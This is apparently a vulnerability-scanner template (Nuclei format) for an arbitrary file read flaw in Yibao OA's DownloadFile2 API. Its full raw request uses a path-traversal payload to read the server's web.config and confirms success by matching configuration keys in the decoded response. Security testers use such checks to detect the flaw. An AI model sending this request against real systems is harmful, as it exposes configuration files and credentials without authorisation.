id: yibao-oa-downloadfile2-read

info:
  name: 易宝OA DownloadFile2 任意文件读取
  author: msk
  severity: high

http:
  - raw:
      - |
        POST /api/files/DownloadFile2 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip

        token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000 

    extractors:
      - type: json
        name: filetext
        part: body
        internal: true
        group: 1
        json:
          - .data

    matchers:
      - type: dsl
        dsl:
          - "status_code==200 && contains_all(base64_decode(filetext),'add key','add name')"